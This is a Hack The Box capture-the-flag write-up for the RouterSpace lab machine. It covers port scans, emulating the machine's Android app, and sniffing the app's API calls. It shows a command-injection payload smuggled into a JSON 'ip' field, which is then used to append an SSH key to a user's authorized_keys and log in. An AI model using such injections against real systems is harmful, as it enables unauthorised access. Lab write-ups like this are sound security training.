@@ -1,0 +1,571 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Hack The Box - RouterSpace" /><meta name="author" content="h3xit" /><meta property="og:locale" content="en" /><meta name="description" content="Challenge description" /><meta property="og:description" content="Challenge description" /><link rel="canonical" href="https://h3xitsec.github.io/posts/htb-routerspace/" /><meta property="og:url" content="https://h3xitsec.github.io/posts/htb-routerspace/" /><meta property="og:site_name" content="h3xit’s ~" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-08T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - RouterSpace" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@h3xit" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"h3xit"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://h3xitsec.github.io/posts/htb-routerspace/"},"description":"Challenge description","url":"https://h3xitsec.github.io/posts/htb-routerspace/","@type":"BlogPosting","headline":"Hack The Box - RouterSpace","dateModified":"2022-03-13T22:02:30-04:00","datePublished":"2022-03-08T00:00:00-05:00","@context":"https://schema.org"}</script><title>Hack The Box - RouterSpace | h3xit's ~</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="h3xit's ~"><meta name="application-name" content="h3xit's ~"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">h3xit's ~</a></div><div class="site-subtitle font-italic">CTF Writeups and other stuff about my journey into cybersecurity</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/h3xitsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['h3xit','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - RouterSpace</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - RouterSpace</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/h3xitsec">h3xit</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-03-08 00:00:00 -0500" data-toggle="tooltip" data-placement="bottom" title="Tue, Mar 8, 2022, 12:00 AM -0500" >Mar 8</em> </span> <span> Updated <em class="timeago" date="2022-03-13 22:02:30 -0400 " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 13, 2022, 10:02 PM -0400" >Mar 13</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1936 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h2 id="challenge-description">Challenge description<a href="#challenge-description" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://app.hackthebox.com/machines/RouterSpace">https://app.hackthebox.com/machines/RouterSpace</a></p><p>This VM is a medium Linux machine</p><h2 id="reconnaissance--enumeration">Reconnaissance / Enumeration<a href="#reconnaissance--enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="port-scanning-and-service-identification">Port scanning and service identification<a href="#port-scanning-and-service-identification" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+</pre><td class="rouge-code"><pre>$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC
+[...]
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-RouterSpace Packet Filtering V1
+| ssh-hostkey: 
+|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTJG10LrPb/oV0/FaR2FprNXTVtRobg1Jwy5UOJGrzjWqI8lNDf5DDi3ilSdkJZ0+0Rwr4/gKG5UlyvqCz07XrPfnWG+E7NrgpMpVKR4LF9fbX750gxK+hOSco3qQclv3CUTjTzwMgxf0ltyOg6WJvThYQ3CFDDeOc4T27YqQ/VgwBT92PWu6aZgWX2oAn+X8/fdcejGWeumU9b+rufiNt/pQ1dGUz+wkHeb2pIaA4WfEQLHB1xF33rTZuAXFDiKSb35EpPvhuShsMPQv6Q+NfLAiENgdy+UdybSNH6k1gmPHyroSYoXth7Pelpg+38V9SYtvvoxQRqBbaLApEClTnIM/IvQba9vY8VdfKYDGDcgeuPm8ksnOFPrb5L6axwl0K2ngE4VHQBJM0yxIRo5dELswD1c9O1tR2rq6MbW2giPl6dx/xzEbdVV6VO5n/prjsnpEs8YvNmnELrt6mt0FkcJQ9ageN5ji3pecKxKTVY4J71yf4+cVZKwpX8xI5H6E=
+|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiksdoNGb5HSVU5I64JPbS+qDrMnHaxiFkU+JKFH9VnP69mvgdIM9wTDl/WGjeWV2AJsl7NLQQ4W0goFL/Kz48=
+|   256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2psOHQ+E45S1f8MOulwczO6MLHRMr+DYtiyNM0SJw8
+80/tcp open  http    syn-ack
+|_http-title: RouterSpace
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 4DEC9F02017F347C687806F17B9F0729
+|_http-trane-info: Problem with XML parsing of /evox/about
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-14884
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 71
+|     ETag: W/"47-JvR+cWIPtJTQukQQfRo3wdT96ls"
+|     Date: Tue, 01 Mar 2022 05:21:17 GMT
+|     Connection: close
+|     Suspicious activity detected !!! {RequestID: a5 F aan n z dAf IC }
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-2349
+|     Accept-Ranges: bytes
+|     Cache-Control: public, max-age=0
+|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
+|     ETag: W/"652c-17d476c9285"
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 25900
+|     Date: Tue, 01 Mar 2022 05:21:17 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;
+|     &lt;html class="no-js" lang="zxx"&gt;
+|     &lt;head&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+|     &lt;title&gt;RouterSpace&lt;/title&gt;
+|     &lt;meta name="description" content=""&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;link rel="stylesheet" href="css/bootstrap.min.css"&gt;
+|     &lt;link rel="stylesheet" href="css/owl.carousel.min.css"&gt;
+|     &lt;link rel="stylesheet" href="css/magnific-popup.css"&gt;
+|     &lt;link rel="stylesheet" href="css/font-awesome.min.css"&gt;
+|     &lt;link rel="stylesheet" href="css/themify-icons.css"&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     X-Powered-By: RouterSpace
+|     X-Cdn: RouterSpace-94769
+|     Allow: GET,HEAD,POST
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 13
+|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
+|     Date: Tue, 01 Mar 2022 05:21:17 GMT
+|     Connection: close
+|     GET,HEAD,POST
+|   RTSPRequest, X11Probe: 
+|     HTTP/1.1 400 Bad Request
+|_    Connection: close
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.92%I=7%D=3/1%Time=621DAD4F%P=x86_64-pc-linux-gnu%r(NULL,
+SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.92%I=7%D=3/1%Time=621DAD4F%P=x86_64-pc-linux-gnu%r(GetRe
+SF:quest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
+SF:-Cdn:\x20RouterSpace-2349\r\nAccept-Ranges:\x20bytes\r\nCache-Control:\
+SF:x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021\
+SF:x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:\
+SF:x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x20
+SF:Tue,\x2001\x20Mar\x202022\x2005:21:17\x20GMT\r\nConnection:\x20close\r\
+SF:n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20class=\"no-js\"\x20lang=\"zxx\"&gt;\n&lt;he
+SF:ad&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"utf-8\"&gt;\n\x20\x20\x20\x20&lt;meta
+SF:\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\"&gt;\n\x20\x20\x2
+SF:0\x20&lt;title&gt;RouterSpace&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\"descri
+SF:ption\"\x20content=\"\"&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\"viewport\"\x2
+SF:0content=\"width=device-width,\x20initial-scale=1\"&gt;\n\n\x20\x20\x20\x2
+SF:0&lt;link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\"&gt;\n\x20
+SF:\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.mi
+SF:n\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"css/ma
+SF:gnific-popup\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20hr
+SF:ef=\"css/font-awesome\.min\.css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"styl
+SF:esheet\"\x20href=\"css/themify-icons\.css\"&gt;\n\x20\x20")%r(HTTPOptions,
+SF:108,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x
+SF:20RouterSpace-94769\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text
+SF:/html;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMed
+SF:pZYGrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Tue,\x2001\x20Mar\x202022\x2005:
+SF:21:17\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPReque
+SF:st,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r
+SF:\n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
+SF:20close\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20200\x20OK\r\nX-
+SF:Powered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-14884\r\nContent-Ty
+SF:pe:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2071\r\nETag:\x2
+SF:0W/\"47-JvR\+cWIPtJTQukQQfRo3wdT96ls\"\r\nDate:\x20Tue,\x2001\x20Mar\x2
+SF:02022\x2005:21:17\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20a
+SF:ctivity\x20detected\x20!!!\x20{RequestID:\x20a5\x20\x20\x20\x20F\x20aan
+SF:\x20n\x20\x20z\x20dAf\x20IC\x20\x20}");
+</pre></table></code></div></div><h3 id="web-enumeration">Web Enumeration<a href="#web-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>I browsed the site manually and found a link to download a file named RouterSpace.apk</p><p>I tried numerous tools to try and find something else but I didn’t</p><h2 id="apk-analysis">APK analysis<a href="#apk-analysis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>The file I downloaded is an Android application package. There must be a simpler way of doing it, but here’s what I did:</p><p>I fired up a Kali Linux VM and installed <a href="https://github.com/anbox/anbox">Anbox</a> on it. Anbox is a container based Android emulator. I also installed adb, which is a cmdline tool to interact with Android devices.</p><p>With my VM connected to HTB’s VPN, Anbox device is able to ping the target IP but doesn’t resolve the hostname routerspace.htb. Since the emulated device isn’t rooted, I was unable to edit the hosts file from within the device.</p><p>What I had to do is unpack the android image file, edit the hosts file and repack the img:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo mv</span> /var/lib/anbox/android.img /tmp/android.img
+<span class="nv">$ </span>unsquashfs /tmp/android.img
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'2.2.2.2 routerspace.htb'</span> <span class="o">&gt;&gt;</span> /tmp/squashfs-rootfs/system/etc/hosts
+<span class="nv">$ </span><span class="nb">sudo </span>mksquashfs squashfs-root android.img <span class="nt">-b</span> 131072 <span class="nt">-comp</span> xz <span class="nt">-Xbcj</span> x86
+<span class="nv">$ </span><span class="nb">sudo mv </span>android.img /var/lib/anbox/android.img
+<span class="nv">$ </span><span class="nb">sudo </span>systemctl restart anbox-container-manager
+</pre></table></code></div></div><p>Now I can test the communication by launching adb shell and ping the hostname:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>adb shell
+
+x86_64:/ <span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
+127.0.0.1       localhost
+::1             ip6-localhost
+2.2.2.2	routerspace.htb
+
+x86_64:/ <span class="nv">$ </span>ping routerspace.htb
+PING routerspace.htb <span class="o">(</span>2.2.2.2<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from routerspace.htb <span class="o">(</span>2.2.2.2<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>61 <span class="nb">time</span><span class="o">=</span>23.2 ms
+64 bytes from routerspace.htb <span class="o">(</span>2.2.2.2<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>2 <span class="nv">ttl</span><span class="o">=</span>61 <span class="nb">time</span><span class="o">=</span>23.2 ms
+</pre></table></code></div></div><p>Next thing I need to do is install the application, again, by using adb :</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>adb <span class="nb">install</span> ./RouterSpace.apk
+</pre></table></code></div></div><p>Now I can open the newly installed application, click next a couple of times and get to a button to test the connectivity of my router.</p><p><img data-src="/assets/img/htb-routerspace/app1.png" alt="app" title="app" data-proofer-ignore></p><p>If I click on the button, it works! The application is able to reach out the target. Now I want to know what happened between those two. In a shell on my VM, I started tcpdump to sniff the ‘anbox0’ interface:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> anbox0 <span class="nt">-A</span> <span class="nt">-s0</span> host 2.2.2.2
+tcpdump: verbose output suppressed, use <span class="nt">-v</span><span class="o">[</span>v]... <span class="k">for </span>full protocol decode
+listening on anbox0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, snapshot length 262144 bytes
+14:52:06.710365 IP 192.168.250.2.53172 <span class="o">&gt;</span> routerspace.htb.http: Flags <span class="o">[</span>S], <span class="nb">seq </span>3244971510, win 64240, options <span class="o">[</span>mss 1460,sackOK,TS val 2575979077 ecr 0,nop,wscale 7], length 0
+E..&lt;..@.@..<span class="se">\.</span>...
+
+.....P.jU..........w.........
+..RE........
+14:52:06.733103 IP routerspace.htb.http <span class="o">&gt;</span> 192.168.250.2.53172: Flags <span class="o">[</span>S.], <span class="nb">seq </span>44160001, ack 3244971511, win 65535, options <span class="o">[</span>mss 1460], length 0
+E..,....?...
+
+.......P.......jU....	.......
+14:52:06.733157 IP 192.168.250.2.53172 <span class="o">&gt;</span> routerspace.htb.http: Flags <span class="o">[</span>.], ack 1, win 64240, length 0
+E..<span class="o">(</span>..@.@..o....
+
+.....P.jU.....P....c..
+14:52:06.734835 IP 192.168.250.2.53172 <span class="o">&gt;</span> routerspace.htb.http: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:278, ack 1, win 64240, length 277: HTTP: POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+E..<span class="o">=</span>..@.@..Y....
+
+.....P.jU.....P....x..POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
+accept: application/json, text/plain, <span class="k">*</span>/<span class="k">*</span>
+user-agent: RouterSpaceAgent
+Content-Type: application/json
+Content-Length: 16
+Host: routerspace.htb
+Connection: Keep-Alive
+Accept-Encoding: <span class="nb">gzip</span>
+
+<span class="o">{</span><span class="s2">"ip"</span>:<span class="s2">"0.0.0.0"</span><span class="o">}</span>
+14:52:06.734982 IP routerspace.htb.http <span class="o">&gt;</span> 192.168.250.2.53172: Flags <span class="o">[</span>.], ack 278, win 65535, length 0
+E..<span class="o">(</span>....?...
+
+.......P.......jW.P... l..
+14:52:06.769596 IP routerspace.htb.http <span class="o">&gt;</span> 192.168.250.2.53172: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:253, ack 278, win 65535, length 252: HTTP: HTTP/1.1 200 OK
+E..<span class="nv">$.</span>...?...
+
+.......P.......jW.P...MQ..HTTP/1.1 200 OK
+X-Powered-By: RouterSpace
+X-Cdn: RouterSpace-42726
+Content-Type: application/json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: 11
+ETag: W/<span class="s2">"b-ANdgA/PInoUrpfEatjy5cxfJOCY"</span>
+Date: Tue, 08 Mar 2022 20:08:05 GMT
+Connection: keep-alive
+
+<span class="s2">"0.0.0.0</span><span class="se">\n</span><span class="s2">"</span>
+14:52:06.769628 IP 192.168.250.2.53172 <span class="o">&gt;</span> routerspace.htb.http: Flags <span class="o">[</span>.], ack 253, win 63988, length 0
+E..<span class="o">(</span>..@.@..m....
+
+.....P.jW.....P....c..
+14:52:09.688862 IP 192.168.250.2.53172 <span class="o">&gt;</span> routerspace.htb.http: Flags <span class="o">[</span>F.], <span class="nb">seq </span>278, ack 253, win 63988, length 0
+E..<span class="o">(</span>..@.@..l....
+
+.....P.jW.....P....c..
+14:52:09.689054 IP routerspace.htb.http <span class="o">&gt;</span> 192.168.250.2.53172: Flags <span class="o">[</span>.], ack 279, win 65535, length 0
+E..<span class="o">(</span>....?...
+
+.......P.......jW.P....o..
+14:52:09.712759 IP routerspace.htb.http <span class="o">&gt;</span> 192.168.250.2.53172: Flags <span class="o">[</span>F.], <span class="nb">seq </span>253, ack 279, win 65535, length 0
+E..<span class="o">(</span>....?...
+
+.......P.......jW.P....n..
+14:52:09.712795 IP 192.168.250.2.53172 <span class="o">&gt;</span> routerspace.htb.http: Flags <span class="o">[</span>.], ack 254, win 63988, length 0
+E..<span class="o">(</span>..@.@.j.....
+
+.....P.jW.....P...%y..
+^C
+11 packets captured
+11 packets received by filter
+0 packets dropped by kernel
+</pre></table></code></div></div><p>Between the TCP syn/ack garbage, we can see the actual HTTP requests that are made and the answers (thanks to httpwithoutans)</p><p>The application is interacting with an api endpoint on the target machine and send a json payload with an ip of 0.0.0.0. Server replies with “0.0.0.0”</p><p>It’s time to replay this request in Burp Suite to see what I can get from it. After a lot of fuzzing, I found an os command injection vulnerability.</p><p>If I send this payload :</p><div class="language-json highlighter-rouge"><div class="code-header"> <span label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"ip"</span><span class="p">:</span><span class="s2">"0.0.0.0.;id"</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>Server replies with :</p><div class="language-r highlighter-rouge"><div class="code-header"> <span label-text="R"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="s2">"0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"</span><span class="w">
+</span></pre></table></code></div></div><p>Confirming RCE through os command injection</p><h2 id="exploitation--foothold">Exploitation &amp;&amp; Foothold<a href="#exploitation--foothold" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>I tried many many many ways to get a reverse shell, but the target just can’t reach attacker’s machine.</p><p>To get a foothold, I had to inject a public key into /home/paul/.ssh/authorized_keys then connect to the target using the private key :</p><div class="language-r highlighter-rouge"><div class="code-header"> <span label-text="R"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">v4</span><span class="o">/</span><span class="n">monitoring</span><span class="o">/</span><span class="n">router</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">check</span><span class="o">/</span><span class="n">deviceAccess</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="m">1.1</span><span class="w">
+</span><span class="n">Host</span><span class="o">:</span><span class="w"> </span><span class="m">10.10.11.148</span><span class="w">
+</span><span class="n">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span><span class="w"> </span><span class="n">RouterSpaceAgent</span><span class="w">
+</span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span><span class="w"> </span><span class="m">609</span><span class="w">
+</span><span class="n">Connection</span><span class="o">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+
+</span><span class="p">{</span><span class="s2">"ip"</span><span class="o">:</span><span class="s2">"0.0.0.0;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAA[...redacted...]pmUNA7G/flYc='&gt;&gt;/home/paul/.ssh/authorized_keys"</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh paul@<span class="nv">$ip</span> <span class="nt">-i</span> ./id_rsa
+paul@routerspace:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
